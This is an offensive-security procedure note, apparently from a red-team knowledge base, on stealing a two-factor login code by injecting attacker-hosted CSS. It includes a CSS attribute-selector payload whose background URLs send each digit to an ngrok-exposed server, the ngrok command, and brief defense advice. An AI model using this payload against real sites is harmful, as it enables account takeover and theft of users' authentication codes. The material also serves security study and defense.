---
tags:
  - css-exfiltration
  - 2fa-bypass
type: procedure
tools:
  - '[[tools/ngrok]]'
  - '[[tools/Custom-Kotlin-Ktor-Server]]'
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/ngrok-tunnel-http]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:32:57.950Z'
skill_level: advanced
impact_level: critical
detection_risk: high
sub_techniques: []
id: b248fe6f-7723-4c18-869f-b67670b2c899
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Exfiltrate 2FA Code Using CSS Selectors

## Summary

Load user-controlled CSS to exfiltrate 2FA input values via attribute selectors and background URLs.

## Description

Set app_style to ngrok URL serving CSS: input[name=code_%d][value='%s'] { background:url(/hit?char=%s&position=%d); }, capturing 'pzZ3ZDZ' over requests during 2FA entry.

## Requirements

1. Local server for CSS
2. Ngrok tunnel
3. Unsanitized CSS loading

## Defense

Defensive measures: Sanitize CSS inputs, disable external styles; Detection: Monitor outbound requests to unusual domains.

## Objectives

1. Serve malicious CSS
2. Capture exfil requests
3. Expected outcome: Full 2FA code

## Instructions

### Step 1: Start Tunnel and Server

**Context**: Expose CSS endpoint.

**Command** ([[commands/ngrok-tunnel-http]]):
```bash
./ngrok http 8080
```

> Use ngrok URL in app_style param.

### Step 2: Submit and Monitor

**Context**: Trigger exfil during 2FA.

Set app_style and submit login; monitor server hits.

> Expected output: Char-by-char exfil of code.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]] Collection

### Techniques

- [[JavaScript]] JavaScript (CSS injection analog)

### Sub-Techniques

- None

## Commands Used

- [[commands/ngrok-tunnel-http]]

## Tools Used

- [[tools/ngrok]]
- [[tools/Custom-Kotlin-Ktor-Server]]

## Tags

- css-exfiltration
- 2fa-bypass
